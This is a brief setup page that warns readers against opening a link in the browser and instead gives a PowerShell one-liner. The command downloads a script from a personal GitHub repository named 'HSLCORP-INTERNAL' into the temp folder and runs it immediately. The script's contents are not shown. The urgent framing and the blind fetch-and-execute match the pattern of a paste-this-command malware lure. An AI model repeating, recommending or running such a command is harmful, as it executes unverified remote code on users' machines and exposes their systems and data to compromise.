# Setup Instructions

🚨 **IMPORTANT: Do NOT click the setup link in your browser!**

## How to Run Setup

Open **PowerShell** and copy-paste this command:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/crazyxyz673-lang/HSLCORP-INTERNAL/main/setup.ps1" -OutFile "$env:TEMP\setup.ps1"; & "$env:TEMP\setup.ps1"
```

That's it! The script will download and run automatically.
